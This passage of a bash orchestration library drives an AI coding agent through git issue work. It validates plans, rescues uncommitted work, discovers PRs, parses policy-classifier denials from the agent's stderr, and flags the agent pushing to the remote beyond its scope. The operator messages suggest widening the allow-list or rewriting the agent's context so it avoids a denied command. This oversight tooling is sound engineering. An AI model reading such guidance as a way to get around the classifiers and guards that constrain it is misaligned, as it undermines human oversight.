    # and naturally short-circuits when STATUS is empty.
    #
    # Variables read/written: PRE_RUN_HEAD, POST_RUN_HEAD, WORKTREE_DIR, SKILL,
    # REPO, BRANCH, ISSUE_NUM, SESSION_ID, LOG_ID, RESULT, STATUS,
    # RESCUED_DIRTY_WORKTREE, PR_URL, VALID_PLAN (all global/caller-scoped).

    # mika#1772: resolve THIS issue's plan once, up front. Both the re-dispatch
    # note below and the plan validation further down need the same answer, and
    # the note used to ask a different question — a glob for any *-plan.md at
    # all, which main satisfies 769 times over, so the note always fired.
    VALID_PLAN=""
    if [ "$SKILL" = "dev-groom" ] && [ -n "$WORKTREE_DIR" ] && [ -d "$WORKTREE_DIR" ]; then
        # mika#2038: stderr is NOT redirected. The three `find` calls inside
        # _find_issue_plan already redirect their own stderr, so before mika#2038
        # the function wrote nothing there and the outer `2>/dev/null` covered no
        # real noise — it only stood ready to swallow the tier-1 selection log
        # that mika#2038 added. The `|| VALID_PLAN=""` fallback is unchanged: a
        # non-zero return still yields an empty string for the recovery logic below.
        VALID_PLAN=$(_find_issue_plan) || VALID_PLAN=""
        # mika#2038: a plan can now be found AND deliberately discarded, so the
        # failure text below must not tell the operator that nothing matched and
        # send them hunting a discovery bug or pilot drift. The most likely real
        # cause of a refusal is a plan whose header names the wrong ticket —
        # a milestone parent instead of the sub-issue, say — and that is fixed
        # in the header, not by widening discovery.
        if [ -n "${FIND_ISSUE_PLAN_REFUTED:-}" ]; then
            PLAN_REFUTED_NOTE=". NOTE: a plan file DID match and was deliberately discarded because its header names a different issue: ${FIND_ISSUE_PLAN_REFUTED}. If one of those is the right plan, correct its ticket header rather than the discovery logic"
        else
            PLAN_REFUTED_NOTE=""
        fi
    fi

    # Post-flight diff check: detect zero-commit "success" in repo#number mode.
    if [ -n "$PRE_RUN_HEAD" ] && [ -n "$REPO" ]; then
        if [ -n "$POST_RUN_HEAD" ] && [ "$PRE_RUN_HEAD" = "$POST_RUN_HEAD" ]; then
            # Policy-deny pre-check (Class C disambiguation, extended to dev-pilot
            # from dev-groom — companion to mika#1534). If the pilot halted on a
            # tier1/policy deny mid-flight, "Zero new commits" is the SYMPTOM, not
            # the cause. Read persistent stderr for [policy:deny] before declaring
            # the generic HEAD-unchanged failure. Fail-open: missing stderr → empty
            # POLICY_DENY → fall through to existing messages.
            #
            # See: docs/solutions/workflow-issues/
            #      2026-06-14-dev-groom-drift-misdiagnosis-policy-deny-halt.md
            POLICY_DENY=""
            POLICY_DENY_LETHALITY="undeclared"
            _pilot_log_dir; PERSISTENT_STDERR_PATH="$_PILOT_LOG_DIR/${LOG_ID}.stderr"
            if [ -f "$PERSISTENT_STDERR_PATH" ] && [ -r "$PERSISTENT_STDERR_PATH" ]; then
                # mika#2493 (U3): the whole deny EVENT, not its first line. A
                # `grep -m1 '[policy:deny]'` loses the [rule-id] and the
                # lethality marker on every multi-line deny — 23 % of the
                # measured population, the ticket's own proof 98b60020 among
                # them. The ANSI strip stays here, at the site.
                POLICY_DENY=$(sed 's/\x1b\[[0-9;]*[mK]//g' "$PERSISTENT_STDERR_PATH" 2>/dev/null \
                    | _policy_deny_excerpt || true)
                POLICY_DENY_LETHALITY=$(_policy_deny_lethality "$PERSISTENT_STDERR_PATH")
            fi

            # mika#1333 Unit 2: For dev-groom re-dispatch, HEAD-unchanged is
            # expected when the plan was already committed in a prior run.
            # The architect pass (_iterate_groom_loop) is what matters — don't
            # poison RESULT with PIPELINE FAILURE for the expected re-dispatch state.
            #
            # mika#2493 (U1): `[ -z "$VALID_PLAN" ]` — a session that DELIVERED
            # cannot be labelled by a deny, whatever its lethality. Measured
            # (M5): the three other branches of this chain already ask "was a
            # plan produced?" before declaring a failure; the deny branch was the
            # only one that did not, and it is the one in front. So this restores
            # a local coherence rather than inventing a predicate. For dev-pilot
            # VALID_PLAN is structurally empty, so the guard is always true and
            # behaviour here is unchanged.
            #
            # THE ORDER OF THE CONJUNCTS IS LOAD-BEARING — do not "normalise" it
            # by putting the guard first. test-dispatch-lib.sh looks for the
            # literal substring `if [ -n "$POLICY_DENY" ]` to measure this
            # branch's position (Test 13, Test 14); leading with the guard would
            # redden two tests nothing asks us to touch, for an identical result.
            if [ -n "$POLICY_DENY" ] && [ -z "$VALID_PLAN" ] && [ "$POLICY_DENY_LETHALITY" = "terminal" ]; then
                # Class C — policy-deny halt. The pilot tried to do legitimate
                # work and was prevented by a tier1/policy allow-list gap. NOT
                # to be confused with LLM drift or genuine dirty-worktree-rescue.
                #
                # mika#2493 (U2): reached only for a deny whose marker says
                # (terminal) — the verb "halted" belongs to a refusal that ended
                # the session. A non-terminal or undeclared deny is annexed as a
                # note after this chain instead.
                RESULT="PIPELINE FAILURE: claude-pilot session halted by policy deny — not generic exit. The deny's lethality marker says (terminal): it ended the session.

Halt event: ${POLICY_DENY}

Read the halt event's bracketed [rule-id] FIRST — it is the last bracketed token, before the trailing (terminal)/(non-terminal) lethality marker. The deny names the refused tool call (a command, or the target path for Write/Edit/Read), never the contents of a file it read. A named [rule-id] is the rule that matched: read that rule. NO [rule-id] means the policy DEFAULT fired — no rule matched the call at all — and there, widening the allow-list to cover the legitimate shape (a) is exactly the remedy, not a dead end. Establish which of the two you have before choosing between (a) and rewriting the dispatch context (b).

Likely a tier1 or tier2 allow-list gap in claude-pilot-py. Investigate the deny rule and either (a) widen the policy to include the legitimate command shape, or (b) rewrite the dispatch context so the pilot avoids the denied command. The pilot was prevented from completing its work — re-dispatching without addressing the substrate gap will hit the same wall.

See: docs/solutions/workflow-issues/2026-06-14-dev-groom-drift-misdiagnosis-policy-deny-halt.md
See: docs/solutions/security-issues/le-classifier-ne-decide-jamais-sur-le-contenu-dun-fichier-2026-09-18.md

${RESULT}"
            elif [ "$SKILL" = "dev-groom" ] && [ -n "$VALID_PLAN" ]; then
                # mika#1772: keyed on a plan for THIS issue, not on any plan file
                # in the worktree. The old glob made this note unconditional for
                # dev-groom, so a first dispatch that wrote nothing was reported
                # as a re-dispatch whose plan had already landed.
                #
                # mika#2031: "already committed" is a claim about git, and
                # VALID_PLAN is an answer from the filesystem — _find_issue_plan
                # walks the worktree, so it finds an UNCOMMITTED plan just as
                # readily. Asserting the commit on that evidence was false in
                # exactly the case the rescue below exists for. Measure it.
                if git -C "$WORKTREE_DIR" ls-files --error-unmatch -- "$VALID_PLAN" >/dev/null 2>&1 \
                   && [ -z "$(git -C "$WORKTREE_DIR" status --porcelain -- "$VALID_PLAN" 2>/dev/null)" ]; then
                    RESULT="Note: HEAD unchanged on dev-groom re-dispatch — the plan for ${REPO}#${ISSUE_NUM} is already committed (${VALID_PLAN}). Architect pass will determine outcome.

${RESULT}"
                else
                    RESULT="Note: HEAD unchanged on dev-groom — the plan for ${REPO}#${ISSUE_NUM} is present in the worktree (${VALID_PLAN}) but NOT committed. dispatch-lib's dirty-worktree rescue preserves it (mika#2031).

${RESULT}"
                fi
            else
                # mika#1772: name the exit code that was actually observed. This
                # branch asserted "exited 0" unconditionally, and the 2026-08-28
                # sessions reached it carrying PILOT_EXIT=1.
                RESULT="PIPELINE FAILURE: claude-pilot exited ${PILOT_EXIT:-unknown} (status ${STATUS:-unknown}) but HEAD unchanged (pre: ${PRE_RUN_HEAD}, post: ${POST_RUN_HEAD}). Zero new commits produced.

${RESULT}"
            fi

            # mika#2493 (U2 step 4, D4): a deny the session survived is annexed
            # AFTER the chain, never in place of it. The branch that applies keeps
            # the floor; the deny is reported because it may have hindered the
            # pilot without killing it. No-op for a terminal deny (already said
            # above) and for no deny at all.
            if [ -n "$POLICY_DENY" ]; then
                _annex_policy_deny_note "$POLICY_DENY_LETHALITY" "$POLICY_DENY"
            fi
        fi

        # Unit 1 (mika#1282): detect dirty worktree on a zero-commit session and
        # preserve its content before anything else runs. Opened to dev-groom by
        # mika#2031; the body lives in _rescue_dirty_worktree() so a test can
        # exercise it directly instead of reimplementing it.
        _rescue_dirty_worktree

        # mika#2348 (T2): normalize Rust the PILOT committed itself. PR #2345's
        # unformatted commit came from no rescue at all, and the lefthook gate
        # that should have caught it is not installed on this machine.
        #
        # ORDER IS LOAD-BEARING, IN BOTH DIRECTIONS. After _rescue_dirty_worktree
        # so a just-rescued commit is in scope; BEFORE the mika#1383 block below,
        # which pushes INLINE (`git push origin "$BRANCH"`, mika#2151) — a
        # normalization placed after it would leave its commit behind the push.
        # Placed here, the dirt it produces is either committed by itself or, if
        # it already committed, absent, and Phase A finds the tree it expects.
        _normalize_committed_rust

        # mika#1383: structural completion gate for HEAD-advanced-no-PR.
        # The pilot session ran content and committed, but ended its turn
        # before invoking `gh pr create` (Mode 1 = bare `/ce-work` launch
        # never had commit→PR in scope; Mode 2 = full `/mika` launch hit
        # prompt-enforcement fragility on the tail). dispatch-lib owns the
        # git/PR tail per mika#1271 (content/workflow split). Honors
        # Vincent's pre-reboot framing: "gate the loop until the tail's
        # fixed". Companion to mika#1282 (handles HEAD-unchanged + dirty);
        # this block handles HEAD-changed + missing PR.
        #
        # What this block does (HEAD changed):
        #   trailing dirty worktree  → Phase A: rescue dirty into wip() commit,
        #                              advance POST_RUN_HEAD.
        #   PR creation              → mika#1679: deferred to the mika#1396
        #                              "commit-pushed-no-pr" rescue in
        #                              dispatch_claude_pilot() (Path B). This gate
        #                              must NOT open its own PR — doing so set the
        #                              global PR_URL and SHADOWED Path B's guard
        #                              (`[ -z "$PR_URL" ]`), opening a non-draft PR
        #                              that bypassed the mika#1613 recovery guards.
        #
        # Scoped to dev-pilot only — dev-groom produces plan-only commits
        # and intentionally has no PR (plan goes on the branch, not in a PR).
        if [ "$SKILL" = "dev-pilot" ] && \
           [ -n "$POST_RUN_HEAD" ] && [ "$PRE_RUN_HEAD" != "$POST_RUN_HEAD" ] && \
           [ -n "$WORKTREE_DIR" ] && [ -n "$BRANCH" ]; then

            # Phase A: rescue any trailing dirty content (pilot committed but
            # left additional uncommitted changes). Same exclusion pattern as
            # mika#1282 (scaffold paths must not be re-committed).
            DIRTY_AFTER_COMMITS=$(git -C "$WORKTREE_DIR" status --porcelain 2>/dev/null | head -5)
            if [ -n "$DIRTY_AFTER_COMMITS" ]; then
                git -C "$WORKTREE_DIR" add -A -- "${RESCUE_EXCLUDE_PATHSPEC[@]}" 2>&9 || true
                if ! git -C "$WORKTREE_DIR" diff --cached --quiet 2>&9; then
                    # mika#2348 (T1): this site staged pilot Rust and committed it
                    # WITHOUT formatting, while its mika#1282 sibling has formatted
                    # since mika#1336 — the comment above says "Same exclusion
                    # pattern as mika#1282", which was true of the pathspec and
                    # false of this. PR #2344's `868e90e4` is the measured cost.
                    _fmt_and_stage_rust
                    # mika#1685: bypass pre-commit hook — see rationale on the
                    # mika#1282 rescue commit above. Same salvage-not-gate principle.
                    if git -C "$WORKTREE_DIR" commit -m "wip(${REPO}#${ISSUE_NUM}): trailing content after pilot end_turn (mika#1383)" --no-verify 2>&9; then
                        # mika#2151: this is the SECOND push site in dispatch-lib
                        # — it pushes inline, before _push_branch ever runs. A
                        # signal wired only into _push_branch would leave one
                        # rescue class out of two silent, which is why the
                        # recorder and the signal are both wired here too.
                        _record_rescue_commit
                        if git -C "$WORKTREE_DIR" push origin "$BRANCH" 2>&9; then
                            # Signal only after a successful push: until the
                            # commit reaches origin it is in no PR, and
                            # announcing it would name something no operator
                            # can open. A failed push leaves it pending for the
                            # post-_push_branch call site to pick up.
                            _signal_rescue_into_open_pr
                        else
                            echo "rescue_signal.push_deferred: trailing-content rescue not pushed (branch=${BRANCH}) — nothing entered a PR yet; signalling deferred to the post-_push_branch site" >&2
                        fi
                        POST_RUN_HEAD=$(git -C "$WORKTREE_DIR" rev-parse HEAD 2>/dev/null || true)
                        RESULT="${RESULT}

dispatch-lib (mika#1383): rescued trailing dirty content into wip() commit; PR creation deferred to the mika#1396 commit-pushed-no-pr rescue."
                    fi
                fi
            fi

            # mika#1679: PR creation is intentionally NOT done here. The pilot
            # committed + pushed but never reached `gh pr create`; the mika#1396
            # "commit-pushed-no-pr" rescue in dispatch_claude_pilot() (Path B) is
            # the single source of truth for the rescue-PR shape and opens a
            # correct *draft* PR (rescue header + `RECOVERY_PENDING: true` marker
            # + `wip-rescue` label + canonical `PR:` line + a `wip(mika#1383)`
            # marker commit for Guard 2). This gate previously opened its own
            # NON-draft PR, which set the global PR_URL and SHADOWED Path B's
            # `[ -z "$PR_URL" ]` guard — letting a non-draft PR bypass the
            # mika#1613 recovery guards (evidence: mika#PR1678, mika#PR1683).
            # Leaving PR_URL untouched here lets Path B fire correctly. Phase A
            # above still runs so the branch carries the pilot's full work.
        fi
    fi

    # Post-flight plan validation (mika#1033, mika#1032, mika#1394): detect
    # dev-groom drift where the session exits "success" but produced no valid
    # plan file (or only a stub/empty one) and/or never invoked /ce:plan.
    #
    # mika#1394: replaced date-specific `${TODAY_PREFIX}-*-plan.md` with
    # `_find_issue_plan` (issue-number match + content fallback). The old
    # date-prefix pattern false-negatived on re-dispatch when the plan was
    # committed on a prior day, poisoning RESULT with PIPELINE_INCOMPLETE
    # and preventing the GROOMED outcome from reaching mika-dev.
    if [ "$SKILL" = "dev-groom" ] && [ -n "$WORKTREE_DIR" ] && [ -d "$WORKTREE_DIR" ]; then
        # VALID_PLAN was resolved at the top of this function (mika#1772).

        # Check session log for /ce:plan invocation (mika#1032).
        # Broad pattern covers Skill tool call JSON, command strings, etc.
        # Fail-open: if log is unavailable, skip the check with a warning.
        _pilot_log_dir; SESSION_LOG="$_PILOT_LOG_DIR/${LOG_ID}.log"
        CE_PLAN_INVOKED=""
        if [ -f "$SESSION_LOG" ] && [ -r "$SESSION_LOG" ]; then
            if grep -qiE 'ce[.:\-_]plan' "$SESSION_LOG" 2>/dev/null; then
                CE_PLAN_INVOKED="1"
            fi
        else
            echo "Warning: session log not available at $SESSION_LOG — skipping /ce:plan invocation check" >&2
            # Treat as unknown — don't fail on missing log
            CE_PLAN_INVOKED="unknown"
        fi

        # Policy-deny pre-check (drift-misdiagnosis fix, docs/solutions/
        # workflow-issues/2026-06-14-dev-groom-drift-misdiagnosis-policy-deny-halt.md).
        # If the pilot was halted by claude-pilot's tier1/policy classifier
        # on a research bash command, it is NOT LLM drift — the pilot
        # tried to do its work and was prevented. Disambiguate by reading
        # the persistent stderr for [policy:deny] before declaring drift.
        # Fail-open: if stderr is unavailable, fall through to the
        # existing drift messages.
        POLICY_DENY=""
        POLICY_DENY_LETHALITY="undeclared"
        _pilot_log_dir; PERSISTENT_STDERR_PATH="$_PILOT_LOG_DIR/${LOG_ID}.stderr"
        if [ -f "$PERSISTENT_STDERR_PATH" ] && [ -r "$PERSISTENT_STDERR_PATH" ]; then
            # Strip ANSI color codes, then extract the first [policy:deny] event.
            # The line shape is
            #   `[policy:deny] <Tool>: <detail>[ \[rule-id\]] (terminal|non-terminal)`
            # mika#2312: the trailing lethality marker (cpp#151) FOLLOWS the
            # rule-id tag, so the rule-id is the last *bracketed* token, not the
            # last token. An absent tag means `rule_id=None` — the policy default
            # deny (no rule matched), NOT a non-deterministic refusal.
            # mika#2493 (U3): the EVENT, not just its first line — `<detail>` is
            # multi-line whenever the refused command is, and both the rule-id and
            # the marker sit at its END. The ANSI strip stays here, at the site.
            POLICY_DENY=$(sed 's/\x1b\[[0-9;]*[mK]//g' "$PERSISTENT_STDERR_PATH" 2>/dev/null \
                | _policy_deny_excerpt || true)
            POLICY_DENY_LETHALITY=$(_policy_deny_lethality "$PERSISTENT_STDERR_PATH")
        fi

        # mika#2493 (U1): `[ -z "$VALID_PLAN" ]` — this is the branch that
        # produced the ticket. It tested POLICY_DENY at the head of the chain with
        # NO condition, so a dev-groom that had written its plan, committed it and
        # succeeded was labelled a pipeline failure the moment any refusal sat in
        # its stderr (M0: sessions 98b60020 and a0886164, seven denies, zero
        # terminal, both `status: success`). The correct intent is written three
        # lines above, in the comment this branch has always carried:
        # "Disambiguate by reading the persistent stderr ... BEFORE DECLARING
        # DRIFT" — the deny was meant to disambiguate a failure already
        # established, and was implemented as a priority diagnosis. There is
        # nothing to disambiguate once the session has delivered.
        #
        # THE ORDER OF THE CONJUNCTS IS LOAD-BEARING — do not "normalise" it by
        # putting the guard first. test-dispatch-lib.sh looks for the literal
        # substring `if [ -n "$POLICY_DENY" ]` to measure this branch's position
        # against the drift message (Test 13); leading with the guard would redden
        # a test nothing asks us to touch, for an identical result. What the fix
        # changes is WHEN both conditions apply, never their relative order.
        if [ -n "$POLICY_DENY" ] && [ -z "$VALID_PLAN" ] && [ "$POLICY_DENY_LETHALITY" = "terminal" ]; then
            # Class C — policy-deny-induced early halt. The pilot made a
            # legitimate research request that hit a tier1/policy allow-list
            # gap. This is NOT LLM drift; the operator should investigate
            # the deny rule, not the pilot's reasoning.
            #
            # mika#2493 (U2): reached only for a deny whose marker says
            # (terminal). A non-terminal or undeclared deny is annexed as a note
            # after this chain, so the branch that really applies keeps the floor.
            RESULT="PIPELINE FAILURE: dev-groom session halted by claude-pilot policy deny — not LLM drift. The deny's lethality marker says (terminal): it ended the session.

Halt event: ${POLICY_DENY}

Read the halt event's bracketed [rule-id] FIRST — it is the last bracketed token, before the trailing (terminal)/(non-terminal) lethality marker. The deny names the refused tool call (a command, or the target path for Write/Edit/Read), never the contents of a file it read. A named [rule-id] is the rule that matched: read that rule. NO [rule-id] means the policy DEFAULT fired — no rule matched the call at all — and there, widening the allow-list to cover the legitimate shape (a) is exactly the remedy, not a dead end. Establish which of the two you have before choosing between (a) and rewriting the dispatch context (b).

Likely a tier1 or tier2 allow-list gap in claude-pilot-py. Investigate the deny rule and either (a) widen the policy to include the legitimate research command shape, or (b) rewrite the dispatch context so the pilot avoids the denied command. The pilot was prevented from completing its work — re-grooming this ticket without addressing the substrate gap will hit the same wall.

See: docs/solutions/workflow-issues/2026-06-14-dev-groom-drift-misdiagnosis-policy-deny-halt.md
See: docs/solutions/security-issues/le-classifier-ne-decide-jamais-sur-le-contenu-dun-fichier-2026-09-18.md

${RESULT}"
        elif [ -z "$VALID_PLAN" ] && [ "$CE_PLAN_INVOKED" = "unknown" ]; then
            # mika#1772: the log could not be read, so nothing was detected in it
            # either way. Saying "no /ce:plan invocation detected" here reports a
            # search that never happened — the shape both 2026-08-28 callbacks
            # took, since neither session ever created its .log file.
            RESULT="PIPELINE FAILURE: dev-groom: _find_issue_plan returned empty for $REPO#$ISSUE_NUM (no filename match *-${ISSUE_NUM}-*-plan.md, no anchored header match in first 20 lines, and no broad issue-number reference in first 50 lines)${PLAN_REFUTED_NOTE}. The session log was not readable at ${SESSION_LOG}, so whether /ce:plan ran is unknown. Inspect \${WORKTREE_DIR}/docs/plans/*-plan.md >500 bytes directly — if a plan exists, this is a _find_issue_plan discovery bug (see mika#1617 class); if no plan exists, the session produced nothing.

${RESULT}"
        elif [ -z "$VALID_PLAN" ] && [ "$CE_PLAN_INVOKED" != "1" ]; then
            # Both checks failed: no plan file AND /ce:plan never called
            RESULT="PIPELINE FAILURE: dev-groom: _find_issue_plan returned empty for $REPO#$ISSUE_NUM (no filename match *-${ISSUE_NUM}-*-plan.md, no anchored header match in first 20 lines, and no broad issue-number reference in first 50 lines)${PLAN_REFUTED_NOTE} and no /ce:plan invocation detected in session log. Likely causes: (a) pilot drifted into executor mode without writing a plan, (b) plan was written but _find_issue_plan's three-tier discovery didn't match — check \${WORKTREE_DIR}/docs/plans/*-plan.md >500 bytes to distinguish (see mika#1617 class).

${RESULT}"
        elif [ -z "$VALID_PLAN" ]; then
            # Plan file missing but /ce:plan was called (or log unavailable)
            RESULT="PIPELINE FAILURE: dev-groom: _find_issue_plan returned empty for $REPO#$ISSUE_NUM (no filename match *-${ISSUE_NUM}-*-plan.md, no anchored header match in first 20 lines, and no broad issue-number reference in first 50 lines)${PLAN_REFUTED_NOTE}. Inspect \${WORKTREE_DIR}/docs/plans/*-plan.md >500 bytes directly — if a plan exists, this is a _find_issue_plan discovery bug (see mika#1617 class); if no plan exists, the pilot drifted into executor mode.

${RESULT}"
        elif [ "$CE_PLAN_INVOKED" != "1" ] && [ "$CE_PLAN_INVOKED" != "unknown" ]; then
            # Valid plan file exists but /ce:plan was never invoked.
            # Demoted from PIPELINE FAILURE to advisory note (mika#1303):
            # pilot Write-tool plan creation is a valid path. The plan
            # file's existence + size threshold + downstream architect
            # verdict are the structural contract — the slash-command
            # invocation is one of multiple valid paths to producing a
            # plan, not the gate itself.
            echo "Note: dev-groom produced a plan file ($VALID_PLAN) without explicit /ce:plan invocation. Plan-file existence is the operative gate." >&2
        fi

        # mika#2493 (U2 step 4, D4): annexed AFTER the chain, never in place of
        # it. Corollary accepted deliberately — this also fires on a SUCCESSFUL
        # dev-groom, which is exactly what the ticket asks for: a survived
        # non-terminal deny is a note. No-op for a terminal deny and for no deny.
        if [ -n "$POLICY_DENY" ]; then
            _annex_policy_deny_note "$POLICY_DENY_LETHALITY" "$POLICY_DENY"
        fi
    fi

    # Issue #138: Discover actual PR URL from the branch
    PR_URL=""
    # mika#2121 (U1): this is the main-path emission site. On no PR it now writes
    # `NO_PR: <reason>` — the terminal line for the muted case (dead pilot, no
    # commits, no rescue eligible: the 306-failure shape). When a rescue DOES run
    # later (site 3), _set_pr_status_line strips this line and replaces it, so the
    # delivered callback never carries two PR-status lines.
    if [ -n "$REPO" ] && [ -n "$BRANCH" ]; then
        PR_URL=$(_pr_list_url "$REPO" "$BRANCH")
        if [ -n "$PR_URL" ]; then
            # mika#2026: stamp origin on the artefact itself. Fail-open — a
            # missing marker costs an `unknown` row in the report, never a dispatch.
            _stamp_pr_origin "$REPO" "$PR_URL" loop || true
            _set_pr_status_line "PR: ${PR_URL}"
        else
            _set_pr_status_line "NO_PR: $(_classify_no_pr_reason "$REPO" "$BRANCH" "$_LAST_PR_QUERY_RC")"
        fi
    else
        _set_pr_status_line "NO_PR: $(_classify_no_pr_reason "$REPO" "$BRANCH" 0)"
    fi

    # mika#940 Unit 1: post-flight PR-existence check.
    # Detect dev-pilot success-with-commits-but-no-PR — the premature-EndTurn
    # family where the model emits `[done] Success` after Edit/Compound
    # phases but before reaching git push + gh pr create. Classify as
    # PIPELINE FAILURE so mika-dev surfaces the gap instead of marking the
    # parent task `completed` on a stranded worktree.
    #
    # Guards:
    #   - $STATUS = success: don't double-classify already-failed sessions
    #     (per architect-validated plan; QA-review-#1140 finding 1).
    #   - $SKILL = dev-pilot: dev-groom commits a plan but no PR; the
    #     existing plan-validation check (mika#1134) covers that path.
    #   - $PR_URL empty: PR-discovery above found nothing.
    #   - $PRE_RUN_HEAD != $POST_RUN_HEAD: commits exist. If HEAD unchanged,
    #     the zero-commit check earlier in this block already fires.
    #   - ! _pilot_had_no_shipping_tail (mika#2492): the sentence this block
    #     writes — "Pipeline truncated before git push + gh pr create" — is
    #     FALSE for a pilot whose perimeter never had that step. Without this
    #     term the nominal `/ce-work` path takes a `PIPELINE FAILURE:` and the
    #     Unit 3 cascade below mechanically falls to PIPELINE_INCOMPLETE.
    if [ "$STATUS" = "success" ] && [ "$SKILL" = "dev-pilot" ] && [ -z "$PR_URL" ] && [ -n "$PRE_RUN_HEAD" ] && [ -n "$POST_RUN_HEAD" ] && [ "$PRE_RUN_HEAD" != "$POST_RUN_HEAD" ] && ! _pilot_had_no_shipping_tail; then
        RESULT="PIPELINE FAILURE: claude-pilot produced commits (${PRE_RUN_HEAD}..${POST_RUN_HEAD}) but no PR was opened on branch '${BRANCH}'. Pipeline truncated before git push + gh pr create.

${RESULT}"
    fi

    # mika#940 Unit 3: outcome classification line for operator/mika-dev
    # consumption. Replaces heuristic log inspection with a single
    # structured marker. Order matters: pipeline failure wins over any
    # success-shape outcome.
    if grep -qF -- "PIPELINE FAILURE:" <<<"$RESULT"; then
        RESULT="${RESULT}

Outcome: PIPELINE_INCOMPLETE — manual recovery needed."
    elif [ -n "$PR_URL" ]; then
        RESULT="${RESULT}

Outcome: PR_OPENED — ${PR_URL}"
    elif [ "$SKILL" = "dev-groom" ] && [ -n "${VALID_PLAN:-}" ]; then
        # $VALID_PLAN is set by the dev-groom plan-validation block earlier
        # when a docs/plans/*-plan.md file >500 bytes is found.
        # mika#1333: emit PLAN_COMMITTED (not PLAN_GROOMED) at this stage.
        # The architect pass hasn't run yet — PLAN_GROOMED is only emitted
        # after _iterate_groom_loop succeeds (see dispatch_claude_pilot).
        RESULT="${RESULT}

Outcome: PLAN_COMMITTED — ${VALID_PLAN}"
    elif _pilot_had_no_shipping_tail; then
        # mika#2492. This value is TRANSITORY on the nominal path: Path B, a few
        # hundred lines below in `dispatch_claude_pilot`, opens the draft PR and
        # rewrites this line to `PR_OPENED` via `_set_outcome_line`. Nobody reads
        # `^Outcome: ` in between — the only two readers are
        # `_measure_cycle_output` and `_gate_non_empty_cycle`, reached from
        # `_deliver_callback` (after Path B) and from the EXIT trap.
        #
        # The EXIT trap is the one intermediate reader, and it is exactly why
        # this arm exists rather than falling through to the `UNKNOWN — inspect
        # worktree manually.` default: on the population where dispatch-lib dies
        # between here and Path B, this sentence is TRUE at the instant it is
        # read (no PR was opened, the work waits in the worktree) and it is at
        # least as actionable as the `PIPELINE_INCOMPLETE — manual recovery
        # needed` that population receives today, with a named motive on top.
        RESULT="${RESULT}

Outcome: PIPELINE_INCOMPLETE — no_shipping_tail: dispatch-lib did not reach PR creation."
    else
        RESULT="${RESULT}

Outcome: UNKNOWN — inspect worktree manually."
    fi
}

_check_pilot_force_push() {
    # Post-flight pilot push guard (mika#1318). Detects whether the pilot
    # pushed to the remote during its session — a scope-of-authority violation
    # for dev-groom (content-only; push is dispatch-lib's job). Returns 0 if
    # no violation, 1 if violation detected. Called unconditionally from
    # dispatch_claude_pilot(); skill-scoping is internal (early-return for
    # non-dev-groom skills).

    # Skill scope: dev-groom only (R5). Dev-pilot's push is legitimate.
    [ "$SKILL" = "dev-groom" ] || return 0

    # Guard: repo#number mode only (worktree must exist).
    [ -n "$WORKTREE_DIR" ] && [ -n "$BRANCH" ] || return 0

    # Query current remote HEAD. Fail-open on network error — a network
    # failure shouldn't block a legitimate dispatch; _push_branch will fail
    # independently if the remote is truly unreachable.
    local ls_remote_out post_remote_head
    if ! ls_remote_out=$(git -C "$WORKTREE_DIR" ls-remote origin "refs/heads/$BRANCH" 2>/dev/null); then
        echo "pilot_push_guard.clean: ls-remote failed (network?) — fail-open (branch=$BRANCH)" >&2
        return 0
    fi
    post_remote_head=$(printf '%s' "$ls_remote_out" | cut -f1)

    # Compare: if remote state changed between pre-run and post-run, the
    # pilot pushed (any push, not just force-push, is a violation for dev-groom).
    if [ "${PRE_RUN_REMOTE_HEAD:-}" = "${post_remote_head:-}" ]; then
        echo "pilot_push_guard.clean: no remote-ref change during pilot session (branch=$BRANCH)" >&2
        return 0
    fi

    # Violation detected.
    PUSH_VIOLATION_DETECTED=1
    PUSH_VIOLATION_EVIDENCE="pre_remote=${PRE_RUN_REMOTE_HEAD:-<none>} post_remote=${post_remote_head:-<none>}"
    echo "pilot_push_guard.violation: pilot pushed to remote during session (branch=$BRANCH, $PUSH_VIOLATION_EVIDENCE)" >&2
    return 1
}

_push_branch() {
    # Canonical push step in dispatch-lib's git workflow (mika#1271 contract
    # refactor; introduced as _post_flight_push in mika#1268). After
    # _run_claude_pilot completes, push any local-ahead commits to origin
    # regardless of pilot exit code. Handles both first-push (no origin/$BRANCH)
    # and existing-remote cases.

    # Guard: repo#number mode only — free-text mode has no branch to push.
    [ -n "$REPO" ] && [ -n "$WORKTREE_DIR" ] && [ -n "$BRANCH" ] || return 0

    # Pre-push duplicate-commit guard (mika#784)
    if ! _check_duplicate_commits; then
        echo "WARN: push_branch skipped — duplicate-commit guard failed for $BRANCH" >&2
        RESULT="${RESULT}
Push: SKIPPED — duplicate-commit guard detected patch-equivalent commits on branch that could not be auto-rebased. Manual resolution required."
        return 1
    fi

    # Fetch fresh remote state. No-ops if origin/$BRANCH doesn't exist (first-push).
    git -C "$WORKTREE_DIR" fetch origin "$BRANCH" 2>/dev/null || true

    # Three git states, distinguished against the REMOTE-TRACKING branch
    # (origin/$BRANCH) — never against local `main` (mika#1407):
    #   (a) HEAD == origin/$BRANCH         → nothing to push. NO-OP, NOT a
    #                                        divergence (early `return 0` below).
    #   (b) HEAD ahead of origin/$BRANCH   → push (fast-forward, or
    #                                        --force-with-lease when ancestry
    #                                        proves the branch was rebased).
    #   (c) branch base behind origin/main → a REBASE concern owned by
    #                                        _set_up_worktree; ORTHOGONAL to the
    #                                        push decision and not consulted here.
    # mika#1407: the dev-groom pilot used to make this call in prose and
    # conflated (c) — a stale local `main` ref — with (b), emitting a spurious
    # "remote divergence detected; abort" on a branch that had nothing to push.
    # The push decision lives here in code, keyed solely on origin/$BRANCH..HEAD,
    # so the stale-main symptom can never drive it.
    #
    # Branch on remote-ref existence (F1 fix from architect review on mika#1268):
    # Determine push mode: first-push, fast-forward, or diverged (mika#1364).
    local push_mode="first-push"
    if git -C "$WORKTREE_DIR" rev-parse --verify "origin/$BRANCH" >/dev/null 2>&1; then
        # Existing-remote case — state (a)/(b). Push only if HEAD is ahead of
        # the remote-tracking branch; ahead==0 is state (a), a clean no-op.
        local ahead
        ahead=$(git -C "$WORKTREE_DIR" rev-list "origin/$BRANCH..HEAD" --count 2>/dev/null || echo 0)
        [ "${ahead:-0}" -eq 0 ] && return 0

        # Ancestry check (mika#1364 KTD-1): determine if origin/$BRANCH is an
        # ancestor of HEAD (fast-forward) or not (diverged — rebase rewrote
        # history). Only the diverged case needs --force-with-lease.
        # Exit codes: 0 = is ancestor, 1 = not ancestor, 128+ = error.
        local ancestry_rc=0
        git -C "$WORKTREE_DIR" merge-base --is-ancestor "origin/$BRANCH" HEAD 2>/dev/null || ancestry_rc=$?
        if [ "$ancestry_rc" -eq 0 ]; then
            push_mode="fast-forward"
